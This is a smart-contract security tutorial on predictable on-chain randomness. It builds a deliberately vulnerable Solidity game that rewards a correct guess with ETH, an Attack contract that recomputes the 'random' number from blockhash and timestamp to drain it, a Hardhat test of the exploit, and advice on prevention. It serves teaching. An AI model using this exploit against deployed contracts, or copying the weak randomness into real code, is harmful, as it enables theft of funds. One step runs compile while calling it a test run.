# Source of Randomness

Randomness is a hard problem. Computers run code that is written by programmers, and follows a given sequence of steps. As such, it is extremely hard to design an algorithm that will give you a 'random' number, since that random number must be coming from an algorithm that follows a certain sequence of steps. Now, of course, some functions are better than others.

In this case, we will specifically look at why you cannot trust on-chain data as sources of randomness (and also why Chainlink VRF's, that we used in Junior, were created).

## Requirements

- We will build a game where there is a pack of cards.
- Each card has a number associated with it which ranges from `0 to 2²⁵⁶–1`
- Player will guess a number that is going to be picked up.
- The dealer will then at random pick up a card from the pack
- If someone correctly guesses the number, they win `0.1 ETH`
- We will hack this game today :)

## Build

To build the smart contract we will be using [Hardhat](https://hardhat.org/).
Hardhat is an Ethereum development environment and framework designed for full stack development in Solidity. In simple words you can write your smart contract, deploy them, run tests, and debug your code.

- In you folder, you will set up a Hardhat project

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```
  
- If you are on Windows, please do this extra step and install these libraries as well :)

  ```bash
  npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a Hardhat project ready to go!

- Lets first understand what `abi.encodedPacked` does. 
  
  We have previously used `abi.encode` in the Sophomore NFT tutorial. It is a way to concatenate multiple data types into a single bytes array, which can then be converted to a string. This is used to compute the `tokenURI` of NFT collections often. `encodePacked` takes this a step further, and concatenates multiple values into a single bytes array, but also gets rid of any padding and extra values. What does this mean? Let's take `uint256` as an example. `uint256` has 256 bits in it's number. But, if the value stored is just `1`, using `abi.encode` will create a string that has 255 `0`'s and only 1 `1`. Using `abi.encodePacked` will get rid of all the extra 0's, and just concatenate the value `1`.

For more information on `abi.encodePacked`, go ahead and read this [article](https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8)

- Create a file named as `Game.sol` inside your `contracts` folder and add the following lines of code.

  ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.4;

    contract Game {
    constructor() payable {}

        /**
            Randomly picks a number out of `0 to 2²⁵⁶–1`.
        */
        function pickACard() private view returns(uint) {
            // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
            // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
            // which is further converted to a `uint`.
            // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
            uint pickedCard = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
            return pickedCard;
        }

        /**
            It begins the game by first choosing a ramdom number by calling `pickACard`
            It then verifies if the random number selected is equal to `_guess` passed by the player
            If the player guessed the correct number, it sends the player `0.1 ether`
        */
        function guess(uint _guess) public {
            uint _pickedCard = pickACard();
            if(_guess == _pickedCard){
                (bool sent,) = msg.sender.call{value: 0.1 ether}("");
                require(sent, "Failed to send ether");
            }
        }

        /**
            Returns the balance of ether in the contract
        */
        function getBalance() view public returns(uint) {
            return address(this).balance;
        }

    }
  ```

- Now create a file called as `Attack.sol` inside your `contracts` folder and add the following lines of code.

  ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.4;

    import "./Game.sol";

    contract Attack {
        Game game;
        /**
            Creates an instance of Game contract with the help of `gameAddress`
        */
        constructor(address gameAddress) {
            game = Game(gameAddress);
        }

        /**
            attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
            is accessible publically
        */
        function attack() public {
            // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
            // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
            // which is further converted to a `uint`.
            // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
            uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
            game.guess(_guess);
        }

        // Gets called when the contract recieves ether
        receive() external payable{}
    }
  ```

- How the attack takes place is as follows:

  - The hacker calls the `attack` function from the `Attack.sol`
  - `attack` further guesses the number using the same method as `Game.sol` which is
    `uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))`
  - Attacker is able to guess the same number because blockhash and block.timestamp is public information and everybody has access to it
  - The attacker then calls the `guess` function from `Game.sol`
  - `guess` first calls the `pickACard` function which generates the same number using `uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))` because `pickACard` and `attack` were both called in the same block.
  - `guess` compares the numbers and they turn out to be the same.
  - `guess` then sends the `Attack.sol` `0.1 ether` and the game ends
  - Attacker is successfully able to guess the random number

- Now lets write some tests to verify if it works exactly as we hoped.

- Create a new file named `attack.js` inside the `test` folder and add the following lines of code

  ```javascript
  const { ethers, waffle } = require("hardhat");
  const { expect } = require("chai");
  const { BigNumber, utils } = require("ethers");

  describe("Attack", function () {
    it("Should be able to guess the exact number", async function () {
      // Deploy the Game contract
      const Game = await ethers.getContractFactory("Game");
      const _game = await Game.deploy({ value: utils.parseEther("0.1") });
      await _game.deployed();

      console.log("Game contract address", _game.address);

      // Deploy the attack contract
      const Attack = await ethers.getContractFactory("Attack");
      const _attack = await Attack.deploy(_game.address);

      console.log("Attack contract address", _attack.address);

      // Attack the Game contract
      const tx = await _attack.attack();
      await tx.wait();

      const balanceGame = await _game.getBalance();
      // Balance of the Game contract should be 0
      expect(balanceGame).to.equal(BigNumber.from("0"));
    });
  });
  ```

- Now open up a terminal pointing to `Source-of-Randomness` folder and execute this

  ```bash
  npx hardhat compile
  ```

- If all your tests passed, you have sucessfully completed the hack :)

## Preventions

- Don't use `blockhash`, `block.timestamp`, or really any sort of on-chain data as sources of randomness
- You can use [Chainlink VRF's](https://docs.chain.link/docs/chainlink-vrf/) for true source of randomness
